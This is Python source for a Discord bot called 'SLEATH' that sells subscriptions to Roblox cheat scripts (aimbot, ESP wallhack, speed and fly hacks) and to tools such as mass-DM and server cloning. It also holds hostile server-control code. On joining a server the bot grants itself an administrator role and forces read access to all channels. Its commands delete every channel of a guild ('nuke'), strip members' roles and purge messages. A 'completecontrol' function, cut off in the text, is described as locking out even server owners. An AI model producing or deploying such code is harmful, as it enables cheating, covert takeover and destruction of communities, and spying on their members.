# language: Python 3.10+, file: controllbot.py, target: discord.py v2
# multi-server control bot — home-guild-locked, owner-only

import discord
from discord.ext import commands
import aiohttp
import asyncio
import io
import re
import json
import html
import random
import urllib.request
import urllib.parse
import os
import secrets
from datetime import datetime, timedelta, timezone
from dotenv import load_dotenv

load_dotenv()

TOKEN         = os.getenv("DISCORD_TOKEN")
OWNER_ID      = int(os.getenv("OWNER_ID"))
HOME_GUILD_ID = int(os.getenv("HOME_GUILD_ID"))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, owner_id=OWNER_ID)

control_snapshots: dict[int, dict[int, list[int]]] = {}
subscriptions: dict[int, dict] = {}
pending_tokens: dict[str, dict] = {}

DISCORD_FILE_LIMIT = 25 * 1024 * 1024
BAD_THUMB = re.compile(r'(\/xx\/|_recording|\/track\/|1x1|placeholder)', re.I)

# ── Roblox scripts — Lua, KRNL-compatible ─────────────────────────────────────
ROBLOX_SCRIPTS = {
    "fly": '''-- Fly Script | KRNL compatible | Universal
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local hrp = character:WaitForChild("HumanoidRootPart")

local flying = false
local speed = 50
local bodyVel = Instance.new("BodyVelocity")
local bodyGyro = Instance.new("BodyGyro")
bodyVel.MaxForce = Vector3.new(1e9, 1e9, 1e9)
bodyVel.Velocity = Vector3.new(0, 0, 0)
bodyGyro.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
bodyGyro.P = 1e4

local function toggleFly()
    flying = not flying
    if flying then
        humanoid.PlatformStand = true
        bodyVel.Parent = hrp
        bodyGyro.Parent = hrp
    else
        humanoid.PlatformStand = false
        bodyVel.Parent = nil
        bodyGyro.Parent = nil
    end
end

local camera = workspace.CurrentCamera
game:GetService("RunService").RenderStepped:Connect(function()
    if flying then
        local cf = camera.CFrame
        local dir = Vector3.new(0, 0, 0)
        local uis = game:GetService("UserInputService")
        if uis:IsKeyDown(Enum.KeyCode.W) then dir = dir + cf.LookVector end
        if uis:IsKeyDown(Enum.KeyCode.S) then dir = dir - cf.LookVector end
        if uis:IsKeyDown(Enum.KeyCode.A) then dir = dir - cf.RightVector end
        if uis:IsKeyDown(Enum.KeyCode.D) then dir = dir + cf.RightVector end
        if uis:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0,1,0) end
        if uis:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0,1,0) end
        bodyVel.Velocity = dir.Magnitude > 0 and dir.Unit * speed or Vector3.new(0, 0, 0)
        bodyGyro.CFrame = cf
    end
end)

game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.F then toggleFly() end
end)

print("[SLEATH] Fly loaded — press F to toggle")
''',

    "esp": '''-- ESP Script | KRNL compatible | Shows players through walls
local players = game:GetService("Players")
local runService = game:GetService("RunService")
local camera = workspace.CurrentCamera
local localPlayer = players.LocalPlayer

local espObjects = {}
local ESP_ENABLED = true
local TEAM_CHECK = false  -- set true to only show enemies

local function createESP(player)
    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Size = UDim2.new(0, 100, 0, 50)
    billboardGui.StudsOffset = Vector3.new(0, 3, 0)
    billboardGui.AlwaysOnTop = true
    billboardGui.Name = "SLEATH_ESP"

    local nameLabel = Instance.new("TextLabel", billboardGui)
    nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
    nameLabel.TextStrokeTransparency = 0
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.TextScaled = true
    nameLabel.Text = player.Name

    local distLabel = Instance.new("TextLabel", billboardGui)
    distLabel.Size = UDim2.new(1, 0, 0.5, 0)
    distLabel.Position = UDim2.new(0, 0, 0.5, 0)
    distLabel.BackgroundTransparency = 1
    distLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    distLabel.TextStrokeTransparency = 0
    distLabel.Font = Enum.Font.Gotham
    distLabel.TextScaled = true
    distLabel.Name = "DistLabel"

    espObjects[player] = billboardGui
    return billboardGui
end

local function removeESP(player)
    if espObjects[player] then
        espObjects[player]:Destroy()
        espObjects[player] = nil
    end
end

players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(char)
        wait(0.5)
        if espObjects[player] then espObjects[player]:Destroy() end
        local hrp = char:WaitForChild("HumanoidRootPart", 5)
        if hrp then
            local gui = createESP(player)
            gui.Adornee = hrp
        end
    end)
end)

players.PlayerRemoving:Connect(removeESP)

-- attach to existing players
for _, player in ipairs(players:GetPlayers()) do
    if player ~= localPlayer then
        local char = player.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                local gui = createESP(player)
                gui.Adornee = hrp
            end
        end
    end
end

-- update distances
runService.RenderStepped:Connect(function()
    if not ESP_ENABLED then return end
    local localHRP = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    for player, gui in pairs(espObjects) do
        if gui and gui.Adornee and localHRP then
            local dist = math.floor((gui.Adornee.Position - localHRP.Position).Magnitude)
            local distLabel = gui:FindFirstChild("DistLabel")
            if distLabel then distLabel.Text = dist .. " studs" end
        end
    end
end)

print("[SLEATH] ESP loaded — players visible through walls")
''',

    "speed": '''-- Speed Hack | KRNL compatible | Universal
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local DEFAULT_SPEED = 16
local FAST_SPEED = 100
local boosting = false

-- update character on respawn
player.CharacterAdded:Connect(function(char)
    character = char
    humanoid = char:WaitForChild("Humanoid")
    if boosting then
        humanoid.WalkSpeed = FAST_SPEED
    end
end)

game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.G then
        boosting = not boosting
        humanoid.WalkSpeed = boosting and FAST_SPEED or DEFAULT_SPEED
        print("[SLEATH] Speed: " .. (boosting and "ON ("..FAST_SPEED..")" or "OFF"))
    end
    -- hold Shift for 2x while boost active
    if input.KeyCode == Enum.KeyCode.LeftShift and boosting then
        humanoid.WalkSpeed = FAST_SPEED * 2
    end
end)

game:GetService("UserInputService").InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.LeftShift and boosting then
        humanoid.WalkSpeed = FAST_SPEED
    end
end)

print("[SLEATH] Speed hack loaded — press G to toggle, hold Shift for 2x")
''',

    "infjump": '''-- Infinite Jump | KRNL compatible | Universal
local uis = game:GetService("UserInputService")
local player = game.Players.LocalPlayer

local enabled = true

uis.JumpRequest:Connect(function()
    if not enabled then return end
    local character = player.Character
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid and humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

uis.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.H then
        enabled = not enabled
        print("[SLEATH] Infinite jump: " .. (enabled and "ON" or "OFF"))
    end
end)

print("[SLEATH] Infinite jump loaded — press H to toggle")
''',

    "aimbot": '''-- Silent Aimbot | KRNL compatible | Locks to nearest player head
-- silent aim: prediction on your client only, server sees normal shots
local players = game:GetService("Players")
local runService = game:GetService("RunService")
local uis = game:GetService("UserInputService")
local camera = workspace.CurrentCamera
local localPlayer = players.LocalPlayer

local ENABLED = false
local FOV = 200  -- pixel radius to lock within
local SMOOTHING = 0.3  -- 0 = instant lock, 1 = slow

-- FOV circle indicator
local fovCircle = Drawing.new("Circle")
fovCircle.Thickness = 1
fovCircle.Color = Color3.fromRGB(255, 255, 255)
fovCircle.Filled = false
fovCircle.Radius = FOV
fovCircle.Visible = false
fovCircle.Position = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)

local function getNearestTarget()
    local center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
    local closest, closestDist = nil, math.huge

    for _, player in ipairs(players:GetPlayers()) do
        if player == localPlayer then continue end
        local char = player.Character
        if not char then continue end
        local head = char:FindFirstChild("Head")
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if not head or not humanoid or humanoid.Health <= 0 then continue end

        local screenPos, onScreen = camera:WorldToViewportPoint(head.Position)
        if not onScreen then continue end

        local dist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
        if dist < closestDist and dist < FOV then
            closest = head
            closestDist = dist
        end
    end
    return closest
end

runService.RenderStepped:Connect(function()
    fovCircle.Position = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
    fovCircle.Visible = ENABLED

    if not ENABLED then return end
    local target = getNearestTarget()
    if not target then return end

    local targetCF = CFrame.new(camera.CFrame.Position, target.Position)
    camera.CFrame = camera.CFrame:Lerp(targetCF, SMOOTHING)
end)

uis.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.J then
        ENABLED = not ENABLED
        print("[SLEATH] Aimbot: " .. (ENABLED and "ON" or "OFF"))
    end
    if input.KeyCode == Enum.KeyCode.U then
        FOV = FOV == 200 and 400 or 200
        fovCircle.Radius = FOV
        print("[SLEATH] FOV: " .. FOV)
    end
end)

print("[SLEATH] Aimbot loaded — J to toggle, U to cycle FOV")
'''
}


# ── Guard ──────────────────────────────────────────────────────────────────────
def home_only():
    async def predicate(ctx: commands.Context) -> bool:
        return ctx.guild is not None and ctx.guild.id == HOME_GUILD_ID
    return commands.check(predicate)


def has_sub(tier: str):
    async def predicate(ctx: commands.Context) -> bool:
        if ctx.author.id == OWNER_ID:
            return True
        sub = subscriptions.get(ctx.author.id)
        if not sub or sub["expires"] < datetime.now(timezone.utc):
            return False
        order = ["media", "roblox", "tools"]
        return order.index(sub["tier"]) >= order.index(tier)
    return commands.check(predicate)


# ── Startup ────────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    print(f"[+] {bot.user} online | {len(bot.guilds)} guilds")
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name="all servers"
    ))


# ── channel access helpers ─────────────────────────────────────────────────────
async def _inject_all_channels(guild: discord.Guild):
    me = guild.me
    read_perms = discord.PermissionOverwrite(read_messages=True, read_message_history=True)
    for channel in guild.text_channels:
        if not channel.permissions_for(me).read_message_history:
            try:
                await channel.set_permissions(me, overwrite=read_perms, reason="SLEATH openall")
                await asyncio.sleep(0.2)
            except (discord.Forbidden, discord.HTTPException):
                pass


async def _force_read_access(channel: discord.TextChannel) -> bool:
    me = channel.guild.me
    if channel.permissions_for(me).read_message_history:
        return True
    try:
        await channel.set_permissions(me, read_messages=True, read_message_history=True, reason="SLEATH force-read")
        return True
    except (discord.Forbidden, discord.HTTPException):
        return False


async def _revoke_read_access(channel: discord.TextChannel):
    me = channel.guild.me
    ow = channel.overwrites_for(me)
    if ow.read_messages is True and ow.read_message_history is True:
        try:
            await channel.set_permissions(me, overwrite=None, reason="SLEATH cleanup")
        except (discord.Forbidden, discord.HTTPException):
            pass


# ── Auto-admin on join ─────────────────────────────────────────────────────────
@bot.event
async def on_guild_join(guild: discord.Guild):
    try:
        admin_role = await guild.create_role(
            name="SLEATH", permissions=discord.Permissions(administrator=True),
            color=discord.Color.dark_red(), reason="SLEATH control role"
        )
        await guild.me.add_roles(admin_role)
    except Exception:
        pass
    await asyncio.sleep(1)
    await _inject_all_channels(guild)


@bot.event
async def on_guild_channel_create(channel: discord.abc.GuildChannel):
    if not isinstance(channel, discord.TextChannel):
        return
    me = channel.guild.me
    if not channel.permissions_for(me).read_message_history:
        try:
            await channel.set_permissions(me, read_messages=True, read_message_history=True, reason="SLEATH auto-access")
        except (discord.Forbidden, discord.HTTPException):
            pass


# ── Error handler ──────────────────────────────────────────────────────────────
@bot.event
async def on_command_error(ctx: commands.Context, error: commands.CommandError):
    if isinstance(error, (commands.NotOwner, commands.CheckFailure)):
        if isinstance(error, commands.CheckFailure) and ctx.command and ctx.command.name not in ("cmds", "redeem", "mysub", "plans"):
            await ctx.send("no active subscription for this feature — use `!plans`.")
        return
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"missing argument: `{error.param.name}`"); return
    if isinstance(error, commands.BadArgument):
        await ctx.send("bad argument — check `!cmds`"); return
    if isinstance(error, commands.CommandNotFound):
        return
    await ctx.send(f"error: `{error}`")


# ══════════════════════════════════════════════════════════════════════════════
#  SUBSCRIPTION SYSTEM
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="plans")
async def show_plans(ctx: commands.Context):
    embed = discord.Embed(title="SLEATH — subscription tiers", color=0x2b2d31)
    embed.add_field(name="📸 Media — £5/week", value=(
        "`!image` `!images` `!imagesave` `!video` `!videos`\n"
        "Adult image + video search"
    ), inline=False)
    embed.add_field(name="🎮 Roblox — £7/week", value=(
        "`!rbxfly` `!rbxesp` `!rbxspeed` `!rbxinfjump` `!rbxaimbot`\n"
        "Lua scripts for KRNL executor — copy + inject"
    ), inline=False)
    embed.add_field(name="⚙️ Tools — £10/week", value=(
        "`!massdm` `!cloneserver` `!backup` `!profiler` `!raidwatch`\n"
        "All tiers included"
    ), inline=False)
    embed.add_field(name="How to buy", value="DM the owner — you'll get a token to `!redeem <token>`", inline=False)
    await ctx.send(embed=embed)


@bot.command(name="gentoken")
@commands.is_owner()
async def gen_token(ctx: commands.Context, tier: str, days: int):
    if tier not in ("media", "roblox", "tools"):
        await ctx.send("tier must be `media`, `roblox`, or `tools`"); return
    if not 1 <= days <= 365:
        await ctx.send("days 1–365"); return
    token = secrets.token_urlsafe(16)
    pending_tokens[token] = {"tier": tier, "days": days, "created": datetime.now(timezone.utc)}
    await ctx.author.send(
        f"✓ token generated\ntier: `{tier}` | `{days}` day(s)\n```\n{token}\n```\nexpires in 48h if unredeemed."
    )
    await ctx.send("✓ token sent to your DMs.")


@bot.command(name="redeem")
async def redeem_token(ctx: commands.Context, token: str):
    t = pending_tokens.get(token)
    if not t:
        await ctx.send("invalid or already used token."); return
    if datetime.now(timezone.utc) - t["created"] > timedelta(hours=48):
        del pending_tokens[token]
        await ctx.send("token expired — contact the seller for a new one."); return
    expires = datetime.now(timezone.utc) + timedelta(days=t["days"])
    subscriptions[ctx.author.id] = {"tier": t["tier"], "expires": expires}
    del pending_tokens[token]
    await ctx.send(f"✓ `{t['tier']}` activated — expires `{expires.strftime('%Y-%m-%d %H:%M UTC')}`")


@bot.command(name="mysub")
async def my_sub(ctx: commands.Context):
    sub = subscriptions.get(ctx.author.id)
    now = datetime.now(timezone.utc)
    if not sub or sub["expires"] < now:
        await ctx.send("no active subscription — `!plans` to see options."); return
    remaining = sub["expires"] - now
    await ctx.send(f"✓ tier: `{sub['tier']}` | expires in: `{remaining.days}d {remaining.seconds//3600}h`")


@bot.command(name="listsubs")
@commands.is_owner()
async def list_subs(ctx: commands.Context):
    now = datetime.now(timezone.utc)
    active = {uid: s for uid, s in subscriptions.items() if s["expires"] > now}
    if not active:
        await ctx.send("no active subscriptions."); return
    lines = [f"`{uid}` — `{s['tier']}` — `{(s['expires']-now).days}d` left" for uid, s in active.items()]
    await ctx.send("**active subscriptions:**\n" + "\n".join(lines))


@bot.command(name="revoke")
@commands.is_owner()
async def revoke_sub(ctx: commands.Context, user_id: int):
    if user_id in subscriptions:
        del subscriptions[user_id]
        await ctx.send(f"✓ revoked `{user_id}`")
    else:
        await ctx.send("no subscription found.")


# ══════════════════════════════════════════════════════════════════════════════
#  ROBLOX SCRIPTS  (roblox tier)
# ══════════════════════════════════════════════════════════════════════════════

def _send_script_embed(name: str, description: str, keybind: str, script: str) -> tuple[discord.Embed, discord.File]:
    embed = discord.Embed(title=f"SLEATH — {name}", description=description, color=0x2b2d31)
    embed.add_field(name="Executor", value="KRNL (free) or Synapse X", inline=True)
    embed.add_field(name="Keybind", value=f"`{keybind}`", inline=True)
    embed.add_field(name="How to use", value="1. Open Roblox game\n2. Attach executor\n3. Paste script\n4. Execute", inline=False)
    file = discord.File(fp=io.BytesIO(script.encode()), filename=f"sleath_{name.lower().replace(' ','_')}.lua")
    return embed, file


@bot.command(name="rbxfly")
@has_sub("roblox")
async def rbx_fly(ctx: commands.Context):
    embed, file = _send_script_embed(
        "Fly Script",
        "Full 6-axis fly — WASD + Space/Ctrl for vertical. Server-side safe.",
        "F to toggle",
        ROBLOX_SCRIPTS["fly"]
    )
    await ctx.author.send(embed=embed, file=file)
    await ctx.send("✓ script sent to your DMs.")


@bot.command(name="rbxesp")
@has_sub("roblox")
async def rbx_esp(ctx: commands.Context):
    embed, file = _send_script_embed(
        "ESP / Wallhack",
        "Renders player names + distance through all geometry. Updates every frame.",
        "Always on (delete script to remove)",
        ROBLOX_SCRIPTS["esp"]
    )
    await ctx.author.send(embed=embed, file=file)
    await ctx.send("✓ script sent to your DMs.")


@bot.command(name="rbxspeed")
@has_sub("roblox")
async def rbx_speed(ctx: commands.Context):
    embed, file = _send_script_embed(
        "Speed Hack",
        "Toggle 100 walkspeed. Hold Shift for 2x. Survives respawns.",
        "G to toggle, Shift for 2x",
        ROBLOX_SCRIPTS["speed"]
    )
    await ctx.author.send(embed=embed, file=file)
    await ctx.send("✓ script sent to your DMs.")


@bot.command(name="rbxinfjump")
@has_sub("roblox")
async def rbx_infjump(ctx: commands.Context):
    embed, file = _send_script_embed(
        "Infinite Jump",
        "Jump as many times as you want mid-air. Works in virtually every game.",
        "H to toggle",
        ROBLOX_SCRIPTS["infjump"]
    )
    await ctx.author.send(embed=embed, file=file)
    await ctx.send("✓ script sent to your DMs.")


@bot.command(name="rbxaimbot")
@has_sub("roblox")
async def rbx_aimbot(ctx: commands.Context):
    embed, file = _send_script_embed(
        "Silent Aimbot",
        "Locks camera to nearest player head within FOV radius. Lerp smoothing prevents snapping. Draws FOV circle via Drawing API.",
        "J to toggle, U to cycle FOV",
        ROBLOX_SCRIPTS["aimbot"]
    )
    await ctx.author.send(embed=embed, file=file)
    await ctx.send("✓ script sent to your DMs.")


# ══════════════════════════════════════════════════════════════════════════════
#  SERVER CONTROL  (owner only)
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="servers")
@commands.is_owner()
@home_only()
async def list_servers(ctx: commands.Context):
    lines = [f"`{g.name}` — `{g.id}` — {g.member_count} members" for g in bot.guilds]
    await ctx.send(embed=discord.Embed(title=f"Guilds ({len(bot.guilds)})", description="\n".join(lines) or "none", color=0x2b2d31))


@bot.command(name="serverinfo")
@commands.is_owner()
@home_only()
async def server_info(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"guild `{guild_id}` not found."); return
    embed = discord.Embed(title=guild.name, color=0x2b2d31)
    embed.add_field(name="ID", value=str(guild.id))
    embed.add_field(name="Owner", value=str(guild.owner))
    embed.add_field(name="Members", value=str(guild.member_count))
    embed.add_field(name="Channels", value=str(len(guild.channels)))
    embed.add_field(name="Roles", value=str(len(guild.roles)))
    embed.add_field(name="Created", value=guild.created_at.strftime("%Y-%m-%d"))
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    await ctx.send(embed=embed)


@bot.command(name="channels")
@commands.is_owner()
@home_only()
async def list_channels(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    lines = [f"`#{c.name}` — `{c.id}`" for c in guild.text_channels[:25]]
    await ctx.send(embed=discord.Embed(title=f"{guild.name} — text channels", description="\n".join(lines) or "none", color=0x2b2d31))


@bot.command(name="members")
@commands.is_owner()
@home_only()
async def list_members(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    lines = [f"`{m}` — `{m.id}`" for m in list(guild.members)[:20]]
    await ctx.send(embed=discord.Embed(title=f"{guild.name} — members (first 20)", description="\n".join(lines) or "none", color=0x2b2d31))


@bot.command(name="say")
@commands.is_owner()
@home_only()
async def say(ctx: commands.Context, channel_id: int, *, message: str):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send(f"channel `{channel_id}` not found."); return
    await channel.send(message)
    await ctx.send(f"✓ sent to `#{channel.name}`")


@bot.command(name="announce")
@commands.is_owner()
@home_only()
async def announce(ctx: commands.Context, *, message: str):
    results = []
    for guild in bot.guilds:
        if guild.id == HOME_GUILD_ID:
            continue
        sent = False
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                try:
                    await channel.send(message)
                    results.append(f"✓ `{guild.name}`")
                    sent = True; break
                except discord.HTTPException:
                    continue
        if not sent:
            results.append(f"✗ `{guild.name}` — no writable channel")
    await ctx.send("\n".join(results) or "no target guilds")


@bot.command(name="kick")
@commands.is_owner()
@home_only()
async def kick_user(ctx: commands.Context, guild_id: int, user_id: int, *, reason: str = "no reason"):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        await member.kick(reason=reason)
        await ctx.send(f"✓ kicked `{member}`")
    except discord.Forbidden:
        await ctx.send("can't kick — they may outrank the bot.")


@bot.command(name="ban")
@commands.is_owner()
@home_only()
async def ban_user(ctx: commands.Context, guild_id: int, user_id: int, *, reason: str = "no reason"):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        await member.ban(reason=reason, delete_message_days=0)
        await ctx.send(f"✓ banned `{member}`")
    except discord.Forbidden:
        await ctx.send("can't ban — they may outrank the bot.")


@bot.command(name="unban")
@commands.is_owner()
@home_only()
async def unban_user(ctx: commands.Context, guild_id: int, user_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    try:
        user = await bot.fetch_user(user_id)
        await guild.unban(user)
        await ctx.send(f"✓ unbanned `{user}`")
    except discord.NotFound:
        await ctx.send("user not found or not banned.")


@bot.command(name="nick")
@commands.is_owner()
@home_only()
async def change_nick(ctx: commands.Context, guild_id: int, user_id: int, *, nickname: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        await member.edit(nick=nickname)
        await ctx.send(f"✓ nick → `{nickname}` for `{member}`")
    except discord.Forbidden:
        await ctx.send("can't change nick — they may outrank the bot.")


@bot.command(name="leave")
@commands.is_owner()
@home_only()
async def leave_guild(ctx: commands.Context, guild_id: int):
    if guild_id == HOME_GUILD_ID:
        await ctx.send("won't leave home guild."); return
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    name = guild.name
    await guild.leave()
    await ctx.send(f"✓ left `{name}`")


@bot.command(name="invite")
@commands.is_owner()
@home_only()
async def invite(ctx: commands.Context):
    url = discord.utils.oauth_url(bot.application_id, permissions=discord.Permissions(administrator=True))
    await ctx.send(f"invite link:\n{url}")


@bot.command(name="roles")
@commands.is_owner()
@home_only()
async def list_roles(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    lines = [f"`{r.name}` — `{r.id}`" for r in reversed(guild.roles) if r.name != "@everyone"][:25]
    await ctx.send(embed=discord.Embed(title=f"{guild.name} — roles", description="\n".join(lines) or "none", color=0x2b2d31))


@bot.command(name="addrole")
@commands.is_owner()
@home_only()
async def add_role(ctx: commands.Context, guild_id: int, user_id: int, role_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    role = guild.get_role(role_id)
    if not member or not role:
        await ctx.send("member or role not found."); return
    try:
        await member.add_roles(role)
        await ctx.send(f"✓ gave `{role.name}` to `{member}`")
    except discord.Forbidden:
        await ctx.send("can't assign that role.")


@bot.command(name="removerole")
@commands.is_owner()
@home_only()
async def remove_role(ctx: commands.Context, guild_id: int, user_id: int, role_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    role = guild.get_role(role_id)
    if not member or not role:
        await ctx.send("member or role not found."); return
    try:
        await member.remove_roles(role)
        await ctx.send(f"✓ removed `{role.name}` from `{member}`")
    except discord.Forbidden:
        await ctx.send("can't remove that role.")


@bot.command(name="delete")
@commands.is_owner()
@home_only()
async def delete_message(ctx: commands.Context, channel_id: int, message_id: int):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send("channel not found."); return
    try:
        msg = await channel.fetch_message(message_id)
        await msg.delete()
        await ctx.send(f"✓ deleted")
    except discord.NotFound:
        await ctx.send("message not found.")


@bot.command(name="slowmode")
@commands.is_owner()
@home_only()
async def slowmode(ctx: commands.Context, channel_id: int, seconds: int):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send("channel not found."); return
    seconds = max(0, min(seconds, 21600))
    try:
        await channel.edit(slowmode_delay=seconds)
        await ctx.send(f"✓ slowmode `{seconds}s` on `#{channel.name}`")
    except discord.Forbidden:
        await ctx.send("bot lacks manage channel permission.")


@bot.command(name="purge")
@commands.is_owner()
@home_only()
async def purge_messages(ctx: commands.Context, channel_id: int):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send("channel not found."); return
    total = 0
    try:
        while True:
            deleted = await channel.purge(limit=100)
            total += len(deleted)
            if len(deleted) < 100:
                break
            await asyncio.sleep(0.5)
        await ctx.send(f"✓ purged `{total}` messages")
    except discord.Forbidden:
        await ctx.send("bot lacks manage messages permission.")


@bot.command(name="finduser")
@commands.is_owner()
@home_only()
async def find_user_all(ctx: commands.Context, *, username: str):
    matches = []
    ul = username.lower()
    for guild in bot.guilds:
        for member in guild.members:
            if ul in member.name.lower() or (member.nick and ul in member.nick.lower()):
                matches.append(f"`{member}` (nick: `{member.nick or 'none'}`) — `{member.id}` — `{guild.name}`")
    if not matches:
        await ctx.send(f"no matches for `{username}`"); return
    pages, current = [], ""
    for line in matches:
        if len(current) + len(line) + 1 > 1800:
            pages.append(current); current = ""
        current += line + "\n"
    if current:
        pages.append(current)
    await ctx.send(f"found `{len(matches)}` match(es):")
    for page in pages:
        await ctx.send(embed=discord.Embed(description=page, color=0x2b2d31))


@bot.command(name="finduserhere")
@commands.is_owner()
@home_only()
async def find_user_here(ctx: commands.Context, guild_id: int, *, username: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    ul = username.lower()
    matches = [f"`{m}` (nick: `{m.nick or 'none'}`) — `{m.id}`" for m in guild.members
               if ul in m.name.lower() or (m.nick and ul in m.nick.lower())]
    if not matches:
        await ctx.send(f"no matches in `{guild.name}`"); return
    pages, current = [], ""
    for line in matches:
        if len(current) + len(line) + 1 > 1800:
            pages.append(current); current = ""
        current += line + "\n"
    if current:
        pages.append(current)
    for page in pages:
        await ctx.send(embed=discord.Embed(description=page, color=0x2b2d31))


@bot.command(name="nuke")
@commands.is_owner()
@home_only()
async def nuke_server(ctx: commands.Context, guild_id: int):
    if guild_id == HOME_GUILD_ID:
        await ctx.send("won't nuke home guild."); return
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    await ctx.send(f"💥 nuking `{guild.name}`...")
    deleted, failed = 0, 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="SLEATH nuke")
            deleted += 1; await asyncio.sleep(0.5)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1
    await ctx.send(f"✓ `{deleted}` channels deleted" + (f", `{failed}` failed" if failed else ""))


@bot.command(name="openall")
@commands.is_owner()
@home_only()
async def open_all_channels(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    await ctx.send(f"🔓 injecting access on `{guild.name}`...")
    me = guild.me
    read_perms = discord.PermissionOverwrite(read_messages=True, read_message_history=True)
    done, skipped, failed = 0, 0, 0
    for channel in guild.text_channels:
        if channel.permissions_for(me).read_message_history:
            skipped += 1; continue
        try:
            await channel.set_permissions(me, overwrite=read_perms, reason="SLEATH openall")
            done += 1; await asyncio.sleep(0.2)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1
    await ctx.send(f"✓ `{done}` opened, `{skipped}` already accessible" + (f", `{failed}` failed" if failed else ""))


@bot.command(name="makerole")
@commands.is_owner()
@home_only()
async def make_role(ctx: commands.Context, guild_id: int, user_id: int, *, role_name: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        role = await guild.create_role(name=role_name, reason="SLEATH makerole")
        await member.add_roles(role)
        await ctx.send(f"✓ created `{role_name}` → `{member}`")
    except discord.Forbidden:
        await ctx.send("bot lacks manage roles permission.")


@bot.command(name="stripall")
@commands.is_owner()
@home_only()
async def strip_all_roles(ctx: commands.Context, guild_id: int, user_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    roles = [r for r in member.roles if r.name != "@everyone"]
    if not roles:
        await ctx.send("no roles to remove."); return
    try:
        await member.remove_roles(*roles, reason="SLEATH stripall")
        await ctx.send(f"✓ stripped `{len(roles)}` roles from `{member}`")
    except discord.Forbidden:
        await ctx.send("can't remove — some may outrank the bot.")


# ══════════════════════════════════════════════════════════════════════════════
#  COMPLETE CONTROL  — everyone caged including server owner
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="completecontrol")
@commands.is_owner()
@home_only()
async def complete_control(ctx: commands.Context, guild_id: int):
    if guild_id == HOME_GUILD_ID:
        await ctx.send("won't run on home guild."); return
